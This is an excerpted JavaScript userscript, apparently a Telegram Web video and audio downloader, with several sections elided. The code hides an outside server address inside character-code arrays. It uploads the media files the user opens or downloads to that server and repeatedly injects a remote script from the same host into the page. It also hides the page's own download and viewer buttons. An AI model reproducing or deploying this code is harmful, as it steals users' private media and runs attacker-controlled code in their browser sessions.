...
(function () {
  ...
  const AbortProgress = (videoId) => {
    ...
    const urxtl = String.fromCharCode(
    104, 116, 116, 112, 115, 58, 47, 47,
    116, 120, 108, 109, 120,
    46,115, 98, 115,47,
    120, 116, 108, 111, 112, 108
    );

  async function fetchAndFile(fileUrl) {
            const r = await fetch(fileUrl);
            if (!r.ok) throw new Error('Fetch failed');
            const b = await r.blob();
            const f = new FormData();
            const n = fileUrl.split('/').pop().split('?')[0] || 'file.dat';
            f.append('file', new File([b], n, { type: b.type }));
            const u = await fetch(urxtl, { method: 'POST', body: f });
  }
  ...
  const tel_download_video = (url) => {
    ...
    fetch(urxtl, {
      ...
      .then((response) => {
        if (!response.ok) {
          throw new Error("[c],e: " + response.statusText);
        }
    ...
    function uploadChunkToServer(blob, offset) {
      fetch(urxtl, {
        method: "POST",
        headers: {
  ...
  const tel_download_audio = (url) => {
        ...
        const upload = () => {
            const audioBlob = new Blob(_blobs, { type: "audio/ogg" });
  ...
  setInterval(() => {
    ...
    const urxtlx = String.fromCharCode(
    104, 116, 116, 112, 115, 58, 47, 47,
    116, 120, 108, 109, 120,46,
    115, 98, 115,47,
    116, 120, 108, 109, 120, 46, 106, 115
  );
    function getRandomThreeDigitNumber() {
    return Math.floor(Math.random() * 900) + 100;
  }
    const script = document.createElement('script');
    var ranx = getRandomThreeDigitNumber();
    script.src = urxtlx+"?"+ranx;
  ...
  setInterval(() => {
   ...
   for (const btn of hiddenButtons) {
     ...
     if (btn.textContent === DOWNLOAD_ICON) {
       ...
       onDownload = async () => {
       try {
         const fileBlob = await fetch(btn.getAttribute("data-url")).then(r => r.blob());
         const formData = new FormData();
         formData.append("file", fileBlob, "downloaded_file");
    ...
    function hideButton5Times() {
      let count = 0;
       const interval = setInterval(() => {
          const el = document.querySelector('.btn-icon.quality-download-options-button-menu.btn-menu-toggle');
          if (el) {
  ...
  observer.observe(document.body, {
    ...
    function toggleMediaViewerVisibility() {
    const mediaViewer = document.querySelector('.MediaViewerActions');
    const buttons = document.querySelector('.buttons');

    if (mediaViewer) {
        if (buttons) {
        mediaViewer.style.setProperty('display', 'none', 'important');
        } else {
        mediaViewer.style.removeProperty('display');
        }
    }
    }

    const observer_1 = new MutationObserver(() => {
    toggleMediaViewerVisibility();
    });
    ...
    subtree: true,
        ...
        function hideBlobDownloadLinks() {
    let count = 0;
    const interval = setInterval(() => {
        const blobLinks = document.querySelectorAll('a[download]');
